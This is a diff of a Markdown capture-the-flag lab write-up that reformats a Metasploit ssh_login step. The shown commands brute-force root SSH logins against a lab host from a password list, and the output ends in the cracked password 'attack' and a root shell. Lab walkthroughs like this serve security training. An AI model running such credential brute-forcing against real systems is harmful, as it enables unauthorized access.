@@ -274,27 +274,29 @@ set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
 set STOP_ON_SUCCESS true
 set VERBOSE true
 exploit
-
-    [-] 192.230.83.3:22 - Failed: 'root:'
-    [!] No active DB -- Credential data will not be saved!
-    [-] 192.230.83.3:22 - Failed: 'root:!root'
-    [-] 192.230.83.3:22 - Failed: 'root:Cisco'
-    [-] 192.230.83.3:22 - Failed: 'root:NeXT'
-    [-] 192.230.83.3:22 - Failed: 'root:QNX'
-    [-] 192.230.83.3:22 - Failed: 'root:admin'
-    [+] 192.230.83.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-125-generic #141-Ubuntu SMP Wed Aug 10 13:42:03 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
-    [*] Command shell session 1 opened (192.230.83.2:41621 -> 192.230.83.3:22) at 2023-02-16 14:25:47 +0000
-    [*] Scanned 1 of 1 hosts (100% complete)
-    [*] Auxiliary module execution completed
 ```
 
-![Metasploit - ssh_login](.gitbook/assets/image-20230216152841859.png)
+```bash
+[-] 192.230.83.3:22 - Failed: 'root:'
+[!] No active DB -- Credential data will not be saved!
+[-] 192.230.83.3:22 - Failed: 'root:!root'
+[-] 192.230.83.3:22 - Failed: 'root:Cisco'
+[-] 192.230.83.3:22 - Failed: 'root:NeXT'
+[-] 192.230.83.3:22 - Failed: 'root:QNX'
+[-] 192.230.83.3:22 - Failed: 'root:admin'
+[+] 192.230.83.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-125-generic #141-Ubuntu SMP Wed Aug 10 13:42:03 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+[*] Command shell session 1 opened (192.230.83.2:41621 -> 192.230.83.3:22) at 2023-02-16 14:25:47 +0000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
 
 <details>
 <summary>Reveal Flag - root password is: 🚩</summary>
 
 
 `attack`
+
+![Metasploit - ssh_login](.gitbook/assets/image-20230216152841859.png)
 
 </details>
 
